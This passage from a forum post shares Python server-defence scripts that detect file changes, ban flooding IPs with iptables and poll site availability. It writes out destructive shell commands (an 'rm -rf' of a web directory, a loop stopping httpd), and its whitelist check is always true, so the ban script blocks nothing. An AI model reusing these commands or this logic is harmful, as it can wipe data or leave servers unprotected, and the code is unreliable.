/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #0000BB">md5<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'rm&nbsp;-rf&nbsp;/home/size_public_html'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">L&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'9c5302d7c4115dcc4b66da2d5def389c'&nbsp;</span><span style="color: #0000BB">in&nbsp;md5</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">L&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">L&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.5</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;httpd&nbsp;stop'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'echo&nbsp;\'Files&nbsp;Size&nbsp;changed&nbsp;!&nbsp;danger&nbsp;!!!!\'&nbsp;&gt;&nbsp;/home/lamer_detect.txt'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">'\nAll&nbsp;Dead\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'python&nbsp;/root/kill.py'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">sys</span><span style="color: #007700">.exit(</span><span style="color: #0000BB">0</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">'pass&nbsp;,&nbsp;md5:'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">md5&nbsp;<br /></span>
</span>
</code></code></div>
</div>This file is going to run and ban IPs requested by Robot.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#ban.py<br />#!/usr/bin/python<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/ban.py&nbsp;<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'netstat&nbsp;-ntu&nbsp;|&nbsp;awk&nbsp;\'{print&nbsp;$5}\'&nbsp;|&nbsp;cut&nbsp;-d:&nbsp;-f1&nbsp;|&nbsp;sort&nbsp;|&nbsp;uniq&nbsp;-c&nbsp;|&nbsp;sort&nbsp;-n&nbsp;&gt;&gt;&nbsp;/root/IPs.txt'</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;apache2&nbsp;stop'</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">file&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/IPs.txt'</span><span style="color: #007700">)<br />for&nbsp;</span><span style="color: #0000BB">line&nbsp;in&nbsp;file</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">ip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">line<br />&nbsp;&nbsp;Ban&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;word_num&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;words&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">ip</span><span style="color: #007700">.</span><span style="color: #0000BB">split</span><span style="color: #007700">()<br />&nbsp;&nbsp;for&nbsp;</span><span style="color: #0000BB">text_word&nbsp;in&nbsp;words</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">word_num&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">word_num&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">int</span><span style="color: #007700">(</span><span style="color: #0000BB">text_word</span><span style="color: #007700">)&nbsp;&gt;&nbsp;</span><span style="color: #0000BB">20</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Ban&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">word_num&nbsp;is&nbsp;2</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #0000BB">Ban&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;</span><span style="color: #DD0000">'.'&nbsp;</span><span style="color: #0000BB">in&nbsp;text_word</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'127.0.0.1'&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #DD0000">'176.9.183.142'&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #DD0000">'79.175.163.84'&nbsp;</span><span style="color: #0000BB">in&nbsp;text_word</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">skip&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">skip&nbsp;is&nbsp;0</span><span style="color: #007700">:&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'iptables&nbsp;-I&nbsp;INPUT&nbsp;-s&nbsp;%s&nbsp;-j&nbsp;DROP'&nbsp;</span><span style="color: #007700">%</span><span style="color: #0000BB">text_word&nbsp;</span><span style="color: #FF8000">#&nbsp;it&nbsp;use&nbsp;iptables&nbsp;to&nbsp;ban&nbsp;users<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">deny</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'iptables&nbsp;-A&nbsp;INPUT&nbsp;&nbsp;-s&nbsp;%s&nbsp;-j&nbsp;DROP'&nbsp;</span><span style="color: #007700">%</span><span style="color: #0000BB">text_word<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #0000BB">deny</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;iptables-persistent&nbsp;save'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;iptables-persistent&nbsp;restart'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">'/root/Banned.txt'</span><span style="color: #007700">,</span><span style="color: #DD0000">'a'</span><span style="color: #007700">)&nbsp;</span><span style="color: #FF8000">#save&nbsp;ip&nbsp;banned&nbsp;for&nbsp;me<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ip_add&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">text_word&nbsp;</span><span style="color: #007700">+&nbsp;</span><span style="color: #DD0000">'\n'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave</span><span style="color: #007700">.</span><span style="color: #0000BB">write</span><span style="color: #007700">(</span><span style="color: #0000BB">ip_add</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ipsave</span><span style="color: #007700">.</span><span style="color: #0000BB">close</span><span style="color: #007700">()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'rm&nbsp;-rf&nbsp;/root/IPs.txt'</span><span style="color: #007700">)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br /></span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'service&nbsp;apache2&nbsp;start'</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And this file is going to check server [if crashed or not to be open] from inside of your server.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#in.py<br />#!/usr/bin/python<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/in.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing<br /></span><span style="color: #0000BB">Attack&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br /></span><span style="color: #007700">while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.2</span><span style="color: #007700">)<br />&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Ready_Target&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'z3r0d4y.com'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">connection&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">httplib</span><span style="color: #007700">.</span><span style="color: #0000BB">HTTPConnection</span><span style="color: #007700">(</span><span style="color: #0000BB">Ready_Target</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">connection</span><span style="color: #007700">.</span><span style="color: #0000BB">request</span><span style="color: #007700">(</span><span style="color: #DD0000">"GET"</span><span style="color: #007700">,</span><span style="color: #DD0000">'/'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">response&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">connection</span><span style="color: #007700">.</span><span style="color: #0000BB">getresponse</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E404&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'404'<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">ENot&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'Not&nbsp;Found'&nbsp;</span><span style="color: #FF8000">#<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">E404&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">status&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #0000BB">E404&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">reason&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #0000BB">ENot&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">status&nbsp;</span><span style="color: #007700">or&nbsp;</span><span style="color: #0000BB">ENot&nbsp;</span><span style="color: #007700">==&nbsp;</span><span style="color: #0000BB">response</span><span style="color: #007700">.</span><span style="color: #0000BB">reason</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">'yes'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.1</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">'yes'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.1</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;except&nbsp;httplib</span><span style="color: #007700">.</span><span style="color: #0000BB">HTTPException</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">e</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attack&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;except&nbsp;ValueError</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attack&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;except&nbsp;socket</span><span style="color: #007700">.</span><span style="color: #0000BB">timeout</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attack&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;except&nbsp;IOError</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Attack&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">Attack&nbsp;is&nbsp;10</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'python&nbsp;/root/ban.py'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">Attack&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0&nbsp;<br /></span>
</span>
</code></code></div>
</div>This file will check your server status from another host, and you must change check.php file address and upload check.php on other hosting [you can use free hosting], then put url in this script. And notice, you must change ‘z3r0d4y’ word to your site title.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:276px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#out.py<br />#!/usr/bin/python<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/out.py<br /></span><span style="color: #0000BB">import&nbsp;os</span><span style="color: #007700">,</span><span style="color: #0000BB">hashlib</span><span style="color: #007700">,</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">,</span><span style="color: #0000BB">signal</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">,</span><span style="color: #0000BB">time</span><span style="color: #007700">,</span><span style="color: #0000BB">sys</span><span style="color: #007700">,</span><span style="color: #0000BB">httplib</span><span style="color: #007700">,</span><span style="color: #0000BB">pickle</span><span style="color: #007700">,</span><span style="color: #0000BB">socket</span><span style="color: #007700">,</span><span style="color: #0000BB">re</span><span style="color: #007700">,</span><span style="color: #0000BB">urllib2&nbsp;</span><span style="color: #FF8000">#import&nbsp;modules<br /></span><span style="color: #0000BB">stop_event&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">multiprocessing</span><span style="color: #007700">.</span><span style="color: #0000BB">Event</span><span style="color: #007700">()&nbsp;&nbsp;</span><span style="color: #FF8000">#start&nbsp;multiprocessing&nbsp;<br /></span><span style="color: #0000BB">err_c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br /></span><span style="color: #007700">while&nbsp;</span><span style="color: #0000BB">1</span><span style="color: #007700">:<br />&nbsp;&nbsp;</span><span style="color: #0000BB">time</span><span style="color: #007700">.</span><span style="color: #0000BB">sleep</span><span style="color: #007700">(</span><span style="color: #0000BB">0.5</span><span style="color: #007700">)<br />&nbsp;&nbsp;try:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">opnurl&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">urllib2</span><span style="color: #007700">.</span><span style="color: #0000BB">urlopen</span><span style="color: #007700">(</span><span style="color: #DD0000">'http://z3r0d4y.com/check.php'</span><span style="color: #007700">).</span><span style="color: #0000BB">read</span><span style="color: #007700">()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #DD0000">'z3r0d4y'&nbsp;</span><span style="color: #0000BB">in&nbsp;opnurl</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;except</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">E&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;err_c&nbsp;</span><span style="color: #007700">+=&nbsp;</span><span style="color: #0000BB">1<br />&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span style="color: #0000BB">E&nbsp;is&nbsp;1</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">os</span><span style="color: #007700">.</span><span style="color: #0000BB">system</span><span style="color: #007700">(</span><span style="color: #DD0000">'python&nbsp;/root/ban.py'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">err_c&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">0<br />&nbsp;&nbsp;</span><span style="color: #007700">if&nbsp;</span><span 